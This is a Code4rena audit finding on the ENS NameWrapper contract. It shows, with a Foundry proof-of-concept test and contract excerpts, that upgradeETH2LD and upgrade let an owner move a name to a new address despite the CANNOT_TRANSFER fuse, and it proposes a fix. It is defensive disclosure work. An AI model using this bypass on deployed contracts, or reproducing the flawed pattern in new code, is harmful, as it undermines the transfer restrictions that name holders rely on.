## Tags

- bug
- 2 (Med Risk)
- selected for report
- sponsor confirmed
- M-01

# [NameWrapper: Cannot prevent transfer while upgrade even with `CANNOT_TRANSFER` fuse regardless of the upgraded NameWrapper's implementation](https://github.com/code-423n4/2022-11-ens-findings/issues/6) 

# Lines of code

https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L408
https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L436


# Vulnerability details

## Impact

Upon upgrade to a new `NameWrapper` contract, `owner` of the node will be set to the given `wrappedOwner`. Since the node will be `_burn`ed before calling the upgraded NameWrapper, the upgraded NameWrapper cannot check the old owner. Therefore, no matter the upgraded NameWrapper's implementation, it locks the information to check whether the old owner and newly given `wrappedOwner` are the same. If they are not the same, it means basically transferring the name to a new address.

In the case of resolver, the upgraded NameWrapper can check the old resolver by querying to the `ENS` registry, and prevent changing it if `CANNOT_SET_RESOLVER` fuse is burned.

## Proof of Concept

Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.

The proof of concept below demonstrates upgrade process. 


```solidity
// https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol-L215-L243
    function testM2TransferWhileUpgrade() public {
        // using the mock for upgrade contract
        deployNameWrapperUpgrade();
        string memory node_str = 'vitalik.eth';
        string memory sub1_full = 'sub1.vitalik.eth';
        string memory sub1_str = 'sub1';
        (, bytes32 node) = node_str.dnsEncodeName();
        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();

        // wrap parent and lock
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, type(uint16).max /* all fuses are burned */, address(0));
        // sanity check
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | type(uint16).max);
        assertEq(expiry, 2038123728);

        // upgrade as nameWrapper's owner
        vm.prank(root_owner);
        nameWrapper.setUpgradeContract(nameWrapperUpgrade);
        assertEq(address(nameWrapper.upgradeContract()), address(nameWrapperUpgrade));

        // user1 calls upgradeETH2LD
        vm.prank(user1);
        nameWrapper.upgradeETH2LD('vitalik', address(123) /* new owner */, address(531) /* resolver */);
    }
```

Even if the `CANNOT_TRANSFER` fuse is in effect, the user1 can call `upgradeETH2LD` with a new owner. 

Before the `NameWrapper.upgradeETH2LD` calls the new upgraded NameWrapper `upgradeContract`, it calls `_prepareUpgrade`, which burns the node in question. It means, the current `NameWrapper.ownerOf(node)` will be zero.

The upgraded NameWrapper has only the given `wrappedOwner` which is supplied by the user, which does not guarantee to be the old owner (as the proof of concept above shows). As the ens registry and ETH registrar also do not have any information about the old owner, the upgraded NameWrapper should probably set the owner of the node to the given `wrappedOwner`, even if `CANNOT_TRANSFER` fuse is in effect.

On contrary to the owner, although `resolver` is given by the user on the `NameWrapper.upgradeETH2LD` function, it is possible to prevent changing it if the `CANNOT_SET_RESOLVER` fuse is burned, by querying to `ENSRegistry`.

```solidity
// NameWrapper

 408     function upgradeETH2LD(
 409         string calldata label,
 410         address wrappedOwner,
 411         address resolver
 412     ) public {
 413         bytes32 labelhash = keccak256(bytes(label));
 414         bytes32 node = _makeNode(ETH_NODE, labelhash);
 415         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);
 416
 417         upgradeContract.wrapETH2LD(
 418             label,
 419             wrappedOwner,
 420             fuses,
 421             expiry,
 422             resolver
 423         );
 424     }

 840     function _prepareUpgrade(bytes32 node)
 841         private
 842         returns (uint32 fuses, uint64 expiry)
 843     {
 844         if (address(upgradeContract) == address(0)) {
 845             revert CannotUpgrade();
 846         }
 847
 848         if (!canModifyName(node, msg.sender)) {
 849             revert Unauthorised(node, msg.sender);
 850         }
 851
 852         (, fuses, expiry) = getData(uint256(node));
 853
 854         _burn(uint256(node));
 855     }
```


The function `NameWrapper.upgrade` has the same problem.

```solidity
// NameWrapper
 436     function upgrade(
 437         bytes32 parentNode,
 438         string calldata label,
 439         address wrappedOwner,
 440         address resolver
 441     ) public {
 442         bytes32 labelhash = keccak256(bytes(label));
 443         bytes32 node = _makeNode(parentNode, labelhash);
 444         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);
 445         upgradeContract.setSubnodeRecord(
 446             parentNode,
 447             label,
 448             wrappedOwner,
 449             resolver,
 450             0,
 451             fuses,
 452             expiry
 453         );
 454     }
```



## Tools Used

foundry

## Recommended Mitigation Steps

If the `CANNOT_TRANSFER` fuse is set, enforce the `wrappedOwner` to be same as the `NameWrapper.ownerOf(node)`.

<!-- zzzitron M02 -->

